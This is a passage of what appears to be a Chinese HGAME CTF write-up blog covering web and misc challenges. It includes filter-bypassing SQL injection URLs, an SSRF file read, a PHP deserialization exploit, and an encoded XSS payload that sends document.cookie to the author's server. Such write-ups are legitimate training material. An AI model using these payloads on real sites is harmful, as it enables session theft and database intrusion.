class="line">        $img_url = @$_POST[<span class="string">'img_url'</span>];        </span><br><span class="line">        $url_array = parse_url($img_url);        </span><br><span class="line">        <span class="keyword">if</span> (@$url_array[<span class="string">'host'</span>] !== <span class="string">"localhost"</span> &amp;&amp; $url_array[<span class="string">'host'</span>] !== <span class="string">"timgsa.baidu.com"</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;        </span><br><span class="line">        &#125;       </span><br><span class="line">        $c = curl_init();        </span><br><span class="line">        curl_setopt($c, CURLOPT_URL, $img_url);    </span><br><span class="line">        curl_setopt($c, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);        </span><br><span class="line">        $res = curl_exec($c);        </span><br><span class="line">        curl_close($c);        </span><br><span class="line">        $avatar = base64_encode($res);       </span><br><span class="line">        <span class="keyword">if</span>(filter_var($img_url, FILTER_VALIDATE_URL)) &#123;       </span><br><span class="line">            <span class="keyword">return</span> $avatar;        </span><br><span class="line">        &#125;    </span><br><span class="line">    &#125;    </span><br><span class="line">    <span class="keyword">else</span> &#123;        </span><br><span class="line">        <span class="keyword">return</span> base64_encode(file_get_contents(<span class="string">"static/logo.png"</span>));</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></li><li><p>该函数限定我们只能从localhost和timgsa.baidu.com获取外部图片，然而在curl下使用file协议时，host会被忽略但还是能读取到内容</p></li><li>构造file://localhost/flag，flag会被base64编码后显示在img标签中<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img <span class="attribute">height</span>=<span class="string">"200"</span> <span class="attribute">width</span>=<span class="string">"500"</span> <span class="attribute">src</span>=<span class="string">"data:image/jpeg;base64,aGdhbWV7cEhwXzFzX1RoM19CM3NUX0w0bkd1NGdFIUAhfQo="</span>&gt;</span><br></pre></td></tr></table></figure></li></ol><h3 id="Cosmos的留言板-1"><a href="#Cosmos的留言板-1" class="headerlink" title="Cosmos的留言板-1"></a>Cosmos的留言板-1</h3><p>sql注入,用/*1*/代替空格，双写select绕过,由于get方式，注意urlencode<br><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">查库：</span><br><span class="line">id=<span class="number">-1</span><span class="symbol">%27</span><span class="symbol">%2</span>f*<span class="number">1</span>*<span class="symbol">%2</span>funion<span class="symbol">%2</span>f*<span class="number">1</span>*<span class="symbol">%2</span>fselselectect<span class="symbol">%2</span>f*<span class="number">1</span>*<span class="symbol">%2</span>fdatabase()<span class="symbol">%3</span>b<span class="symbol">%23</span></span><br><span class="line">回显:</span><br><span class="line">id:<span class="number">-1</span>'/*<span class="number">1</span>*/union/*<span class="number">1</span>*/<span class="keyword">select</span>/*<span class="number">1</span>*/database()<span class="comment">;#</span></span><br><span class="line"><span class="comment">easysql</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">查表：</span></span><br><span class="line"><span class="comment">id=-1%27union%2f*1*%2fselselectect%2f*1*%2fgroup_concat(table_name)%2f*1*%2ffrom%20%2f*1*%2finformation_schema.tables%2f*1*%2fwhere%2f*1*%2ftable_schema%3d0x6561737973716c%3b%23</span></span><br><span class="line"><span class="comment">回显：</span></span><br><span class="line"><span class="comment">id:-1'union/*1*/select/*1*/group_concat(table_name)/*1*/from/*1*/information_schema.tables/*1*/where/*1*/table_schema=0x6561737973716c;#</span></span><br><span class="line"><span class="comment">f1aggggggggggggg,messages</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">查段：</span></span><br><span class="line"><span class="comment">-1%27%2f*1*%2funion%2f*1*%2fselselectect%2f*1*%2fgroup_concat(column_name)%2f*%201*%2ffrom%2f*1*%2finformation_schema.columns%2f*1*%2fwhere%2f*1*%2ftable_name%3d%20%27f1aggggggggggggg%27%2f*1*%2fand%2f*1*%2ftable_schema%3d%27easysql%27%3b%23</span></span><br><span class="line"><span class="comment">回显：</span></span><br><span class="line"><span class="comment">id:-1'/*1*/union/*1*/select/*1*/group_concat(column_name)/*1*/from/*1*/information_schema.columns/*1*/where/*1*/table_name='f1aggggggggggggg'/*1*/and/*1*/table_schema='easysql';#</span></span><br><span class="line"><span class="comment">fl4444444g</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">getflag:</span></span><br><span class="line"><span class="comment">id=-1%27%2f*1*%2funion%2f*1*%2fselselectect%2f*1*%2ffl4444444g%2f*1*%2ffrom%2f*1*%2ff1aggggggggggggg%3b%23</span></span><br><span class="line"><span class="comment">回显：</span></span><br><span class="line"><span class="comment">id:-1'/*1*/union/*1*/select/*1*/fl4444444g/*1*/from/*1*/f1aggggggggggggg;#</span></span><br></pre></td></tr></table></figure></p><h3 id="Cosmos的新语言"><a href="#Cosmos的新语言" class="headerlink" title="Cosmos的新语言"></a>Cosmos的新语言</h3><figure class="highlight excel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">$<span class="built_in">code</span> = file_get_contents('mycode');</span><br><span class="line">eval($<span class="built_in">code</span>);</span><br><span class="line"></span><br><span class="line">=tmA0ZGMlHmAzMQMzAwLmpwL6xmA1LwLyymZmVwM6pJZ</span><br></pre></td></tr></table></figure><ol><li><p>访问/mycode</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">encrypt</span><span class="params">($str)</span></span>&#123;</span><br><span class="line">    $result = <span class="string">''</span>;</span><br><span class="line">    <span class="keyword">for</span>($i = <span class="number">0</span>; $i &amp;lt; strlen($str); $i++)&#123;</span><br><span class="line">        $result .= chr(ord($str[$i]) + <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> $result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span>(strrev(base64_encode(str_rot13(base64_encode(base64_encode(base64_encode(base64_encode(base64_encode(base64_encode(encrypt($_SERVER[<span class="string">'token'</span>])))))))))));</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(@$_POST[<span class="string">'token'</span>] === $_SERVER[<span class="string">'token'</span>])&#123;</span><br><span class="line">    <span class="keyword">echo</span>($_SERVER[<span class="string">'flag'</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>这里有坑的是加密方式的顺序会变，大概5秒变一次，所以上脚本</p><figure class="highlight oxygene"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"># -*- coding: utf-<span class="number">8</span> -*-</span><br><span class="line">import string</span><br><span class="line">import urllib</span><br><span class="line">import requests</span><br><span class="line">import re</span><br><span class="line"></span><br><span class="line">def dec(s):</span><br><span class="line">    <span class="keyword">result</span> = <span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(s)):</span><br><span class="line">        <span class="keyword">result</span> += chr(ord(s[i])-<span class="number">1</span>)</span><br><span class="line">    return <span class="keyword">result</span></span><br><span class="line"></span><br><span class="line">def rot13(s):</span><br><span class="line">    return s.encode(<span class="string">'rot13'</span>)</span><br><span class="line"></span><br><span class="line">def rev(s):</span><br><span class="line">    return s[::-<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">def b64(s):</span><br><span class="line">    return s.decode(<span class="string">'base64'</span>)</span><br><span class="line"></span><br><span class="line">s = requests.Session()</span><br><span class="line"></span><br><span class="line">url1 = <span class="string">'http://e56bbf7d4b.php.hgame.n3ko.co'</span></span><br><span class="line">r = requests.get(url1)</span><br><span class="line">token = r.text.split(<span class="string">'\n'</span>)[<span class="number">4</span>]</span><br><span class="line">token = token[:-<span class="number">4</span>]</span><br><span class="line">print token</span><br><span class="line">url2 = url1 + <span class="string">'/mycode'</span></span><br><span class="line">r1 = requests.get(url2)</span><br><span class="line"><span class="function"><span class="keyword">method</span> = <span class="title">r1</span>.<span class="title">text</span>.<span class="title">split</span><span class="params">(<span class="string">'\n'</span>)</span>[8]</span></span><br><span class="line"><span class="function"><span class="title">method</span> = <span class="title">method</span>[5:</span>].split(<span class="string">'('</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="function"><span class="keyword">method</span>[<span class="title">i</span>] == '<span class="title">encrypt</span>':</span></span><br><span class="line">        token = dec(token)</span><br><span class="line">    elif <span class="function"><span class="keyword">method</span>[<span class="title">i</span>] == '<span class="title">strrev</span>':</span></span><br><span class="line">        token = rev(token)</span><br><span class="line">    elif <span class="function"><span class="keyword">method</span>[<span class="title">i</span>] == '<span class="title">base64_encode</span>':</span></span><br><span class="line">        token = b64(token)</span><br><span class="line">    elif <span class="function"><span class="keyword">method</span>[<span class="title">i</span>] == '<span class="title">str_rot13</span>':</span></span><br><span class="line">        token = rot13(token)</span><br><span class="line">print token</span><br><span class="line">getflag = s.post( url1, data = <span class="comment">&#123;'token': token&#125;</span> )</span><br><span class="line">print getflag.text</span><br></pre></td></tr></table></figure></li><li><p>有时可能因为base64编码问题报错，尝试几次即可</p></li></ol><h3 id="Cosmos的聊天室"><a href="#Cosmos的聊天室" class="headerlink" title="Cosmos的聊天室"></a>Cosmos的聊天室</h3><ol><li>一道XSS题目,留言板过滤所有闭合的html标签即re.sub(“&lt;/?[^&gt;]+&gt;”, “”, message),之后又过滤了script、iframe并将消息全部大写</li><li>由于浏览器自动补全，所以我们可以不闭合右边，然后加注释，注释掉后面的\,编码绕过大写</li><li><p>最终payload</p><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg/onload=&amp;#<span class="number">119</span>&amp;#<span class="number">105</span>&amp;#<span class="number">110</span>&amp;#<span class="number">100</span>&amp;#<span class="number">111</span>&amp;#<span class="number">119</span>&amp;#<span class="number">46</span>&amp;#<span class="number">111</span>&amp;#<span class="number">112</span>&amp;#<span class="number">101</span>&amp;#<span class="number">110</span>&amp;#<span class="number">40</span>&amp;#<span class="number">39</span>&amp;#<span class="number">104</span>&amp;#<span class="number">116</span>&amp;#<span class="number">116</span>&amp;#<span class="number">112</span>&amp;#<span class="number">58</span>&amp;#<span class="number">47</span>&amp;#<span class="number">47</span>&amp;#<span class="number">52</span>&amp;#<span class="number">55</span>&amp;#<span class="number">46</span>&amp;#<span class="number">57</span>&amp;#<span class="number">56</span>&amp;#<span class="number">46</span>&amp;#<span class="number">50</span>&amp;#<span class="number">52</span>&amp;#<span class="number">51</span>&amp;#<span class="number">46</span>&amp;#<span class="number">49</span>&amp;#<span class="number">50</span>&amp;#<span class="number">56</span>&amp;#<span class="number">47</span>&amp;#<span class="number">63</span>&amp;#<span class="number">39</span>&amp;#<span class="number">43</span>&amp;#<span class="number">100</span>&amp;#<span class="number">111</span>&amp;#<span class="number">99</span>&amp;#<span class="number">117</span>&amp;#<span class="number">109</span>&amp;#<span class="number">101</span>&amp;#<span class="number">110</span>&amp;#<span class="number">116</span>&amp;#<span class="number">46</span>&amp;#<span class="number">99</span>&amp;#<span class="number">111</span>&amp;#<span class="number">111</span>&amp;#<span class="number">107</span>&amp;#<span class="number">105</span>&amp;#<span class="number">101</span>&amp;#<span class="number">41</span>&amp;#<span class="number">59</span>&amp;#<span class="number">47</span>&amp;#<span class="number">47</span></span><br><span class="line"></span><br><span class="line">编码内容为:window.open(<span class="string">'http://vps-ip/?'</span>+document.cookie);<span class="comment">//</span></span><br></pre></td></tr></table></figure></li><li><p>然后在自己服务器日志上找token</p></li></ol><h2 id="misc-1"><a href="#misc-1" class="headerlink" title="misc"></a>misc</h2><h3 id="Cosmos的午餐"><a href="#Cosmos的午餐" class="headerlink" title="Cosmos的午餐"></a>Cosmos的午餐</h3><ol><li>解压附件得到Capture.pcapng和ssl_log.log</li><li>注意到流量包里有许多https/TLS协议的包，不难发现应该是解密流量<a href="https://blog.csdn.net/nimasike/article/details/80887436" target="_blank" rel="noopener">解密SSL参考</a></li><li>值得注意的是最新版wireshark已经 ssl 改为 tls，其实ssl/tls都已统称通信加密协议，所以就放一块了</li><li>把ssl_log.log导入后发现多了许多包，追踪tls流，发现有一个zip压缩包，保存原始数据导出来解压得到Outguess with key.jpg</li><li><p>根据图片名字可知要使用outguess这个工具进行提取数据，然而这个工具需要密码，我们从图片的备注找到密码<a href="https://www.cnblogs.com/2f28/p/9740347.html" target="_blank" rel="noopener">隐写工具outguess安装使用介绍</a></p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">outguess -r -k gUNrbbdR9XhRBDGpzz <span class="string">"Outguess with key.jpg"</span> <span class="keyword">out</span>.txt</span><br></pre></td></tr></table></figure></li><li><p>得到out.txt</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">https:</span><span class="comment">//dwz.cn/69rOREdu</span></span><br></pre></td></tr></table></figure></li><li><p>访问下载zip解压得到一个二维码，扫码识别即可</p></li></ol><h3 id="地球上最后的夜晚"><a href="#地球上最后的夜晚" class="headerlink" title="地球上最后的夜晚"></a>地球上最后的夜晚</h3><ol><li>解压得到一个No password.pdf和.7z压缩包(有密码)，估计密码藏在pdf中，通常pdf隐写和工具wbStego4open相关,而且<strong>No password</strong></li><li>使用工具decode得到密码<blockquote><p>Zip Password: OmR#O12#b3b%s*IW</p></blockquote></li><li>解压得到.doc文件,发现里面并没有隐藏文字，改后缀为zip，最终在secret.xml中找到flag</li></ol><h3 id="所见即为假"><a href="#所见即为假" class="headerlink" title="所见即为假"></a>所见即为假</h3><ol><li>题目给了.zip，一开始其实考的是伪加密，不过360压缩直接判断无密码并看到附加信息<blockquote><p>F5 key: NllD7CQon6dBsFLr</p></blockquote></li><li>直接解压得到FLAG_IN_PICTURE.jpg</li><li><p>所以应该是F5隐写</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git clone https:<span class="comment">//github.com/matthewgao/F5-steganography.git</span></span><br><span class="line">java Extract -<span class="selector-tag">p</span> NllD7CQon6dBsFLr -e out<span class="selector-class">.txt</span> FLAG_IN_PICTURE.jpg</span><br></pre></td></tr></table></figure></li><li><p>得到一个out.txt，内容如下</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">526172211</span>A0701003392B5E50A01050600050101808000B9527AEA2402030BA70004A70020CB5BD C2D80000008666C61672E7478740A03029A9D6C65DFCED5016867616D657B3430383<span class="number">75E7A236D73</span> <span class="number">7733344552746</span>E46557971704B556B32646D4C505736307D1D77<span class="number">565103050400</span></span><br></pre></td></tr></table></figure></li><li><p>明显的rar头，winhex导入十六进制数得到文件，解压得flag</p></li></ol><h3 id="玩玩条码"><a href="#玩玩条码" class="headerlink" title="玩玩条码"></a>玩玩条码</h3><ol><li>解压得到7zipPasswordHere.mp4、Code128.7z和JPNPostCode.png，并自带压缩包备注如下<blockquote><p>Decode JPNPostCode to get MSUStegoVideo password.</p></blockquote></li><li>而JPNPostCode意为日本邮政条码,通过比对和解码得到1087627</li><li><p>进而使用<a href="https://sourceforge.net/projects/vdfiltermod/" target="_blank" rel="noopener">VirtualDub2</a>引入插件<a href="http://www.compression.ru/video/stego_video/index_en.html" target="_blank" rel="noopener">MSUStegoVideo</a>，得到.7z密码，具体过程如下</p><figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>. msu_stegovideo.zip解压到/VirtualDub2_44065/plugins32</span><br><span class="line"><span class="number">2</span>. 打开V<span class="function"><span class="title">irtualDub</span>.exe，Video-&gt;</span>F<span class="function"><span class="title">ilters</span>-&gt;</span><span class="function"><span class="title">add</span>-&gt;</span>MSU S<span class="function"><span class="title">tegoVideo1</span>.0-&gt;</span>OK-&gt;E<span class="function"><span class="title">xtract</span> file from video-&gt;</span>输入条码信息-&gt;OK</span><br><span class="line"><span class="number">3</span>. 然后打开mp4播放一小段就出来一个txt文件</span><br></pre></td></tr></table></figure></li><li><p>打开txt得到7z密码</p><blockquote><p>Zip Password: b8FFQcXsupwOzCe@     </p></blockquote></li><li>解压7z获得code128.png,<a href="https://online-barcode-reader.inliteresearch.com/" target="_blank" rel="noopener">解码得flag</a></li></ol><h1 id="Week-3"><a href="#Week-3" class="headerlink" title="Week-3"></a>Week-3</h1><h2 id="web-2"><a href="#web-2" class="headerlink" title="web"></a>web</h2><h3 id="序列之争-Ordinal-Scale"><a href="#序列之争-Ordinal-Scale" class="headerlink" title="序列之争 - Ordinal Scale"></a>序列之争 - Ordinal Scale</h3><figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">只有达到第一名才能拿到 <span class="built_in">flag</span>！</span><br></pre></td></tr></table></figure><ol><li>点击进去后，数字名字就可以挑战，不断挑战经验越来越高，而且都是挑战成功，但最高只有第二名，得想办法拿到第一名</li><li>F12看到注释source.zip,看来需要审计了</li><li><p>game.php</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span> </span></span><br><span class="line"><span class="php">    <span class="keyword">if</span>($game-&gt;rank-&gt;Get() === <span class="number">1</span>)&#123;<span class="meta">?&gt;</span></span> </span><br><span class="line">    <span class="tag">&lt;<span class="name">h2</span>&gt;</span>hgame&#123;flag_is_here&#125;<span class="tag">&lt;/<span class="name">h2</span>&gt;</span> <span class="php"><span class="meta">&lt;?php</span> </span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure></li><li><p>也就是第一名才能getflag,跟进Get()</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">isset</span>($_SESSION[<span class="string">'rank'</span>]))&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;Set(rand(<span class="number">2</span>, <span class="number">1000</span>));</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">$this</span>-&gt;Set($_SESSION[<span class="string">'rank'</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">Set</span><span class="params">($no)</span></span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;rank = $no;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">Get</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;rank;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>也就是说$rank从Session中获取，我们需要修改Session方法，同时根据题目的序列之争，这道题应该通过反序列化修改Session</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($key)</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;encryptKey = $key;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">isset</span>($_COOKIE[<span class="string">'monster'</span>]))&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;Set();</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $monsterData = base64_decode($_COOKIE[<span class="string">'monster'</span>]);</span><br><span class="line">        <span class="keyword">if</span>(strlen($monsterData) &gt; <span class="number">32</span>)&#123;</span><br><span class="line">            $sign = substr($monsterData, <span class="number">-32</span>);</span><br><span class="line">            $monsterData = substr($monsterData, <span class="number">0</span>, strlen($monsterData) - <span class="number">32</span>);</span><br><span class="line">            <span class="keyword">if</span>(md5($monsterData . <span class="keyword">$this</span>-&gt;encryptKey) === $sign)&#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;monsterData = unserialize($monsterData);</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                session_start();</span><br><span class="line">                session_destroy();</span><br><span class="line">                setcookie(<span class="string">'monster'</span>, <span class="string">''</span>);</span><br><span class="line">                header(<span class="string">'Location: index.php'</span>);</span><br><span class="line">                <span class="keyword">exit</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">$this</span>-&gt;Set();     </span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></li><li><p>想要伪造sign需要知道encryptKey，而encryptKey在game类的sign属性中</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Game</span></span></span><br><span class="line"><span class="class"></span>&#123;   </span><br><span class="line">    <span class="keyword">private</span> $encryptKey = <span class="string">'SUPER_SECRET_KEY_YOU_WILL_NEVER_KNOW'</span>;</span><br><span class="line">    <span class="keyword">public</span> $welcomeMsg = <span class="string">'%s, Welcome to Ordinal Scale!'</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> $sign = <span class="string">''</span>;</span><br><span class="line">    <span class="keyword">public</span> $rank;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($playerName)</span></span>&#123;</span><br><span class="line">        $_SESSION[<span class="string">'player'</span>] = $playerName;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">isset</span>($_SESSION[<span class="string">'exp'</span>]))&#123;</span><br><span class="line">            $_SESSION[<span class="string">'exp'</span>] = <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        $data = [$playerName, <span class="keyword">$this</span>-&gt;encryptKey];</span><br><span class="line">        <span class="keyword">$this</span>-&gt;init($data);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;monster = <span class="keyword">new</span> Monster(<span class="keyword">$this</span>-&gt;sign);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;rank = <span class="keyword">new</span> Rank();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">init</span><span class="params">($data)</span></span>&#123;</span><br><span class="line">        <span class="keyword">foreach</span>($data <span class="keyword">as</span> $key =&gt; $value)&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;welcomeMsg = sprintf(<span class="keyword">$this</span>-&gt;welcomeMsg, $value);</span><br><span class="line">            <span class="keyword">$this</span>-&gt;sign .= md5(<span class="keyword">$this</span>-&gt;sign . $value);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>分析一下init()方法，输入参数$data中有[$playerName, $this-&gt;encryptKey]，而welcomeMsg生成使用了sprintf函数，在第一个循环内，第二个循环的$value即为encryptKey，而sprintf存在格式化字符串漏洞，用%s作为名字可以被第二轮循环中%s的值被替换成 encryptKey,故得到</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gkUFUa<span class="number">7</span>GfPQu<span class="keyword">i3</span>DGUTHX<span class="number">6</span>XIUS<span class="number">3</span>ZAmClL</span><br></pre></td></tr></table></figure></li><li><p>接下来就可以伪造$sign了,考虑到Rank类</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">public <span class="keyword">function</span> __destruct()&#123;</span><br><span class="line">        <span class="regexp">//</span> 确保程序是跑在服务器上的！</span><br><span class="line">        <span class="variable">$this</span>-&gt;serverKey = <span class="variable">$_SERVER</span>[<span class="string">'key'</span>];</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$this</span>-&gt;key === <span class="variable">$this</span>-&gt;serverKey)&#123;</span><br><span class="line">            <span class="variable">$_SESSION</span>[<span class="string">'rank'</span>] = <span class="variable">$this</span>-&gt;rank;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="regexp">//</span> 非正常访问</span><br><span class="line">            session_start();</span><br><span class="line">            session_destroy();</span><br><span class="line">            setcookie(<span class="string">'monster'</span>, <span class="string">''</span>);</span><br><span class="line">            header(<span class="string">'Location: index.php'</span>);</span><br><span class="line">            <span class="keyword">exit</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></li><li><p>其中在设置Session时会对比key和serverkey，而serverkey是服务器环境变量我们无法得知，但可以使用</p><blockquote><p>$this-&gt;key = &amp;$this-&gt;serverKey</p></blockquote></li><li><p>exp如下</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span> </span></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">Rank</span> </span>&#123;    </span></span><br><span class="line"><span class="php">    <span class="keyword">private</span> $rank = <span class="number">1</span>;    </span></span><br><span class="line"><span class="php">    <span class="keyword">private</span> $serverKey;    </span></span><br><span 